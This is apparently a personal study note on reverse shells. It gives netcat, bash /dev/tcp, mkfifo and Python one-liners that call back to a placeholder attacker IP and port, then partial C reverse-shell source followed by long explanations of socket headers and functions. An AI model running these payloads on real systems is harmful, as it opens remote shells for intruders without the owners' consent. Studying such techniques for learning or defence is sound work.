---
title: Reverse Shell
aliases:
  - Reverse Shell
---
## 1. Simple netcat Reverse Shell
---
### Run command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `nc -e /bin/sh {attackers IP} port`

![[images/Pasted image 20250424100653.png]]

## 2. Netcat without -e
---
Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_HOLE` disabled, it means you **don’t have the -e** option of netcat.

> In this case,

### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `mkfifo /tmp/p; nc {attackers IP} <port> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`

![[images/Pasted image 20250424101401.png]]

## 3. Bash
---
### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `bash -c 'sh -i >& /dev/tcp/<Attacker's IP>/<port> 0>&1'`

![[images/Pasted image 20250424101632.png]]

## 4. Python
---
### Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : 
`python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<Attacker's IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`

![[images/Pasted image 20250424120632.png]]

## 5. Reverse Shell in C
---
#### Reverse Shell running on Linux (Target Machine)
### Code
```C
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main () {
	const char* ip = "192.168.0.108";
	
	// address struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);
	
	// socket syscall
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	// connect syscall
	
}
```

### Explanation
---
```C
#include <stdio.h>
```

`<stdio.h>` : It is a **Header file** basic I/O like `printf()`, etc.

---
```C
#include <sys/socket.h>
```
`<sys/socket.h>` is a **header file in C** that provides the **definitions and functions for using sockets**—which are used for network communication.
#### Here's what it includes:

- **Socket-related system calls**:
    - `socket()` – create a socket
    - `bind()` – bind a socket to an IP/port
    - `connect()` – connect to another socket
    - `accept()` – accept an incoming connection
    - `listen()` – mark a socket as passive (waiting for connections)
    - `send()` / `recv()` – send or receive data
- **Socket structures and constants**:
    - `struct sockaddr`
    - `AF_INET`, `SOCK_STREAM`, etc.

`<sys/socket.h>` is what lets your C program **create and work with network sockets** on Unix-like systems.

---
```C
#include <netinet/ip.h>
```
`<netinet/ip.h>` is a C header file that provides **definitions for IP (Internet Protocol) related structures and constants**, specifically for **IPv4** networking.

- The key thing it defines is:
    - `struct iphdr` – this is the structure of an IPv4 header. It describes how an IP packet looks on the network.

In older or more complex socket programs (like raw sockets or packet crafting), you might manually build IP headers. That's when you'd need this file. But for **simple client/server TCP sockets** like your code, it's usually **not necessary** to include `<netinet/ip.h>` unless you’re doing low-level networking.

- `<netinet/ip.h>` gives you access to **IP packet structures**.
- Mostly used for **raw sockets**, **packet analysis**, or **custom protocol implementation**.

---
```C
#include <arpa/inet.h>
```
`<arpa/inet.h>` is a C header file that provides **functions for manipulating IP addresses**, especially for converting between **text (string) and binary formats** used in network programming.

 **🔧 Functions it provides (common ones):**

-  `inet_aton()`
	- Converts a string IP like `"192.168.1.1"` to a binary form.
	- Used in code:
	  ```c
	    inet_aton(ip, &addr.sin_addr);
	    ```
-  `inet_ntoa()`
	- Opposite of `inet_aton()` — converts a binary IP back to a string.
- `inet_pton()` and `inet_ntop()`
	- Newer versions of `aton` and `ntoa`, and they support both **IPv4 and IPv6**.
	- `pton`: presentation → numeric        
    - `ntop`: numeric → presentation        

When you're dealing with sockets in C, the system doesn't understand IPs as strings like `"10.9.1.6"` — it wants them in **binary form** (`struct in_addr`), and `<arpa/inet.h>` gives you the tools to do that conversion.

| Function                                  | What it does                                                                                                         |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `inet_aton()`                             | "192.168.0.1" → binary                                                                                               |
| `inet_ntoa()`                             | binary → "192.168.0.1"                                                                                               |
| `inet_pton()`                             | text to binary (IPv4/IPv6)                                                                                           |
| `inet_ntop()`                             | binary to text (IPv4/IPv6)                                                                                           |
| `uint32_t htonl(uint32_t hostlong)`       | The **htonl**() function converts the unsigned integer _hostlong_ from host byte order to network byte order.        |
| `uint16_t htons(uint16_t hostshort);`<br> | The **htons**() function converts the unsigned short integer _hostshort_ from host byte order to network byte order. |
| `uint32_t ntohl(uint32_t netlong);`<br>   | The **ntohl**() function converts the unsigned integer _netlong_ from network byte order to host byte order.         |
| `uint16_t ntohs(uint16_t netshort);`      | The **ntohs**() function converts the unsigned short integer _netshort_ from network byte order to host byte order.  |

---
```C
#include <unistd.h>
```
`<unistd.h>` is a **POSIX (Unix standard)** header file that gives you access to **low-level OS functions**, mainly related to **I/O, processes, and [file descriptors](https://en.wikipedia.org/wiki/File_descriptor)**.

**`dup2(int oldfd, int newfd)`**
- Duplicates one [file descriptor](https://en.wikipedia.org/wiki/File_descriptor) onto another.
- In  code:
    ```c
    dup2(sockfd, i);
    ```
This redirects `stdin`, `stdout`, and `stderr` to the socket.

**`execve(const char *path, char *const argv[], char *const envp[])`**
- Replaces the current process with a new one.
- In code:
    ```c
    execve("/bin/sh", NULL, NULL);
    ```
This gives the attacker a shell.

**Other common things in `<unistd.h>`:**

| Function   | What it does                            |
| ---------- | --------------------------------------- |
| `read()`   | Read data from a file/socket            |
| `write()`  | Write data to a file/socket             |
| `fork()`   | Create a new process                    |
| `close()`  | Close a file descriptor                 |
| `getpid()` | Get the current process ID              |
| `sleep()`  | Pause execution for a number of seconds |
`<unistd.h>` gives you direct access to **system-level functions** for:
- **Process control**
- **File/socket I/O**
- **Execing new programs**

It's essential for making C programs that interact closely with the OS.

---
```C
int main()
```

In C, `main()` is the **entry point** of any program.

When you run a compiled C program, the operating system calls the `main()` function **first** — always. It’s where your program **starts executing**.

**📌 Why `int`?**

The `int` before `main` means the function returns an **integer** to the operating system. This value tells the system if the program **succeeded** or **failed**.
- Returning `0` means **success**.
- Returning any non-zero number usually means **an error**.
Example:

```c
int main() {
    // your code
    return 0; // success
}
```

**Variations of `main()`:**
1. **No command line arguments**:
    ```c
    int main() { ... }
    ```
2. **With command line arguments**:
    ```c
    int main(int argc, char *argv[]) { ... }
    ```
    - `argc` (argument count): Number of command-line arguments.
    - `argv` (argument vector): Array of strings containing the arguments.

---
```C
const char* ip = "192.168.0.108";
```

 **`const`**
- This means the value the pointer points to **can’t be changed**.
- You’re saying: _“I’m not going to modify this string.”_

 **`char*`**
- A pointer to a **character (char)** — in this case, the **first character of a string**.

**`"10.9.1.6"`**
- This is a **string literal** (a sequence of characters).
- It's stored in **read-only memory** in C.

**`ip`**
- This is the **variable name**, and it holds the pointer to the first character of the string.

---
```c
struct sockaddr_in addr;
```
You're creating a variable `addr` of type `struct sockaddr_in`.

This structure is used to **store IPv4 socket address information** — like IP address and port — that the socket will connect or bind to.

> **Why `sockaddr_in` and not just `sockaddr`?**

1.  `struct sockaddr_in` — **specific to IPv4**
- Contains **fields for IP and port** that are easy to work with.
- Designed to make **setting up IPv4 addresses** easier.
- Used for:
    - `connect()`, `bind()`, `accept()`, etc. — but via a cast to `sockaddr`.

```c
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
inet_aton("10.9.1.6", &addr.sin_addr);
```

You set the IP and port **directly** using its named fields.

2.  `struct sockaddr` = **generic placeholder**

- It’s a more **abstract structure**.
- Used as a **base type** that works for **any protocol** (IPv4, IPv6, Unix domain, etc.).
- Looks like this:

```c
struct sockaddr {
    unsigned short sa_family;   // Address family (AF_INET, AF_INET6, etc.)
    char sa_data[14];           // Protocol-specific address data
};
```

**Notice:** it doesn’t tell you **how to structure IP addresses or ports** - it just holds raw data.

The actual structure (like `sockaddr_in` for IPv4 or `sockaddr_in6` for IPv6) is **cast to `sockaddr*`** when passed into socket functions.

> **🧠 Analogy**

Think of `sockaddr` as a **base class** or **interface** (like in OOP).  
And `sockaddr_in`, `sockaddr_in6`, `sockaddr_un` are the **specific implementations**.

You _store the real info_ in `sockaddr_in`, but _pass it around_ as a `sockaddr*`.

| Struct        | Use for | Contains IP & Port? | Used in system calls |
| ------------- | ------- | ------------------- | -------------------- |
| `sockaddr_in` | IPv4    | ✅ Yes               | ✅ (via cast)         |
| `sockaddr`    | Generic | ❌ No (raw only)     | ✅ Required type      |

---
```C
addr.sin_family = AF_INET
```

`sin_family` is a field inside the `struct sockaddr_in` structure.  
It tells the system **what kind of addresses you're working with**.

| Constant   | Meaning                 |
| ---------- | ----------------------- |
| `AF_INET`  | IPv4 addresses          |
| `AF_INET6` | IPv6 addresses          |
| `AF_UNIX`  | UNIX domain (local IPC) |

This is critical because without it, the system won’t know how to interpret the rest of the data (like `sin_port` and `sin_addr`).

- `addr.sin_family = AF_INET;`  
    ➤ You're saying, _"this socket uses IPv4 addresses."_

---
```C
addr.sin_port = htons(4444);
```

`sin_port` is a field in the `struct sockaddr_in` that stores the **port number** your program will connect to or listen on.

Ports must be stored in **network byte order**, not the way your computer stores numbers (host byte order).  

That’s where `htons()` comes in.

`htons()` is a function from `<arpa/inet.h>`
`htons()` stands for:

> **Host TO Network Short**

- **Host** = your machine's internal number format (could be [little-endian](https://www.geeksforgeeks.org/little-and-big-endian-mystery/)).
- **Network** = the standard [big-endian](https://www.geeksforgeeks.org/little-and-big-endian-mystery/) format used in networking.
- **Short** = 16-bit number (because a port is 2 bytes).

```c
htons(4444)
```

➡ Converts `4444` to a 16-bit **network byte order** number.

**🧠 Why is byte order important?**

Different computers may store bytes differently (big-endian vs little-endian).  
But on the internet, everyone agrees to use **network byte order** (big-endian).

> [!Hint] Title
> If you don’t convert the port using `htons()`, it could look like a totally different number on the network.

> “Store port `4444` in network byte order in the `addr` structure.”

| Part            | Meaning                                                  |
| --------------- | -------------------------------------------------------- |
| `addr.sin_port` | The port number field in `sockaddr_in`                   |
| `htons(4444)`   | Converts port 4444 to **network byte order**             |
| Why?            | So all devices on the network understand it the same way |

---
```C
inet_aton(ip, &addr.sin_addr);
```

> **What is `inet_aton()`?**

It stands for: 
	**Internet** – **ASCII TO Network**

In short:
- Converts an IP address **in text (string)** form (like `"10.9.1.6"`)

| Function                  | Purpose                                      |
| ------------------------- | -------------------------------------------- |
| `inet_aton()`             | Converts IP from string → binary (`in_addr`) |
| Input ➡ `ip`              | `"10.9.1.6"` (text)                          |
| Output ➡ `&addr.sin_addr` | Stored in `addr.sin_addr` in binary          |
1. **`char* ip = "10.9.1.6";`**
This line declares a **pointer to a string**:
```c
char* ip = "10.9.1.6";
```
- `char* ip` means you're declaring a pointer that will point to a character (`char`), or more specifically, a sequence of characters (a string). 
- `"10.9.1.6"` is a **string literal**. This is essentially an array of characters in memory:
    ```
    10.9.1.6\0
    ```
    The `\0` at the end is the **null terminator** that marks the end of the string in C.
- `ip` will point to the **first character** of this string. So, `ip` stores the **memory address** where `"10.9.1.6"` starts.

2. **What Does `inet_aton(ip, &addr.sin_addr)` Do?**
- `inet_aton()` converts a **dotted-decimal string IP address** (like `"10.9.1.6"`) to its **binary representation** (network byte order).
- The first parameter (`ip`) is the **string** you want to convert — it’s just the **memory address** of the first character of `"10.9.1.6"`.
- The second parameter (`&addr.sin_addr`) is the **memory location** where the result will be stored. `&addr.sin_addr` gives us the **address** of `sin_addr` in the `sockaddr_in` structure, which is of type `struct in_addr`.

3. **What Does `inet_aton` Do Internally?**
Here’s what happens when `inet_aton()` runs:
- It reads the string `"10.9.1.6"`.
- It converts it to **binary** in **network byte order**.

For example:
- `"10.9.1.6"` becomes `0x0A090106` (in hexadecimal).
    - `10` → `0x0A`
    - `9` → `0x09`
    - `1` → `0x01`
    - `6` → `0x06`
- This value is **stored** in the `sin_addr.s_addr` field of `addr`. Since `inet_aton()` uses network byte order, it would be stored as:
    ```
    0x0A090106
    ```

4. **What Does `addr.sin_addr` Contain?**
After calling `inet_aton(ip, &addr.sin_addr)`:
- `addr.sin_addr` will contain the **binary representation** of the IP address.
In this case:
```c
addr.sin_addr.s_addr = 0x0A090106;  // Network byte order: 10.9.1.6
```

The **conversion** happens internally, and the result is stored in the second argument (`struct in_addr *inp`).

For example:

```c
inet_aton("10.9.1.6", &addr.sin_addr);
```

- **`"10.9.1.6"`** is the **string IP address**.
- **`&addr.sin_addr`** is the **pointer to the memory location** where the **binary network form** of the IP will be stored.
 So:
- `inet_aton()` **does not return the binary address directly**.
- Instead, it **stores the binary address in the location** pointed to by `inp` (in this case, `&addr.sin_addr`).
- The function itself just returns `1` (success) or `0` (failure).

---
```C
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

The `socket()` function is used to create a **new socket** for communication between processes over a network. It's the first step in setting up communication.
1. **`AF_INET`** (Address Family)
	- **`AF_INET`** stands for **Address Family - Internet**.
	- It means you're using **IPv4 addresses** (like `192.168.0.1` or `10.9.1.6`).
If you wanted to use IPv6 addresses instead, you would use:
```c
AF_INET6
```

2. **`SOCK_STREAM`** (Socket Type)
	- **`SOCK_STREAM`** means you're creating a **stream socket**.
	- **Stream sockets** provide **reliable, connection-oriented communication** (like TCP).
	- **TCP (Transmission Control Protocol)** is used for most network communications because it ensures that data is delivered correctly and in order.
If you wanted to use a **datagram socket** (which is connectionless, like UDP), you would use:
```c
SOCK_DGRAM
```
3. **`0`** (Protocol)
	- The third argument (`0`) specifies the protocol to be used.
	- When it's set to `0`, it tells the system to automatically pick the correct protocol based on the **address family** and **socket type**.
For **IPv4 + SOCK_STREAM**, the system will choose **TCP** as the default protocol (since it's the most common for stream sockets).
You could manually specify a protocol like this:
```c
IPPROTO_TCP   // For TCP
IPPROTO_UDP   // For UDP
```

🔸 **What Happens Inside the `socket()` Call?**
1. The **operating system** creates a new socket object in the kernel.
2. It associates this socket with the **networking protocols** based on the arguments you provided (`AF_INET`, `SOCK_STREAM`, and `0`). 
3. It returns a **[file descriptor](https://en.wikipedia.org/wiki/File_descriptor)** (which is an integer, here it's `sockfd`) that you can use to refer to this socket for later operations, like connecting, reading, writing, etc.

`sockfd`:
- **`sockfd`** will hold the **socket file descriptor** — a unique identifier for this socket.
- You’ll use this descriptor to perform actions on the socket (e.g., connect, send, receive).
> **In Summary:**
1. Creates a **TCP socket** (since `SOCK_STREAM` and `AF_INET` are used).
2. The socket will be used for **IPv4** addresses (`AF_INET`).
3. `0` lets the system pick the default protocol (TCP for stream sockets).
4. The **file descriptor** for the new socket is stored in `sockfd`, which will be used in future socket-related operations like `connect()`, `bind()`, `send()`, etc.
---
```c
for (int i =0; i < 3; i++){
	dup2(sockdf, i);
}
```